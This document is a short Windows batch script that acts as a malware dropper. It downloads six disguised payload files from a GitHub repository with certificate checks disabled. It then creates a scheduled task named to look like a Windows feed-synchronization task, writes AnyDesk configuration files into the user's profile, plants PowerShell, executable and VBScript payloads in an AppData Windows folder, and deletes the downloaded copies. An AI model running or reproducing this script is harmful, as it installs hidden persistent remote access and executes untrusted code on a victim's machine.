mode 15,1
curl -k -L -o "%~dp0asdfhk0" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/applevbs.vmd"
curl -k -L -o "%~dp0asdfhk1" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/bananaps1.vmd"
curl -k -L -o "%~dp0asdfhk2" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/gamser.vmd"
curl -k -L -o "%~dp0asdfhk3" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/gamsys.vmd"
curl -k -L -o "%~dp0asdfhk4" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/orangeany.vmd"
curl -k -L -o "%~dp0asdfhk5" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/tomatoxml.vmd"

schtasks /create /tn User_Feed_Synchronization-{0DDC78AB-E733-425C-B92B-ABAC149AB11232} /xml "%~dp0asdfhk5" /f
md "%appdata%\AnyDesk"
copy /Y "%~dp0asdfhk2" "%appdata%\AnyDesk\service.conf"
copy /Y "%~dp0asdfhk3" "%appdata%\AnyDesk\system.conf"
copy /Y "%~dp0asdfhk1" "%appdata%\Microsoft\windows\default_an.ps1"
copy /Y "%~dp0asdfhk4" "%appdata%\Microsoft\windows\default_an.exe"
copy /Y "%~dp0asdfhk0" "%appdata%\Microsoft\windows\default_an.vbs"
del "%~dp0*asdfhk*" /f
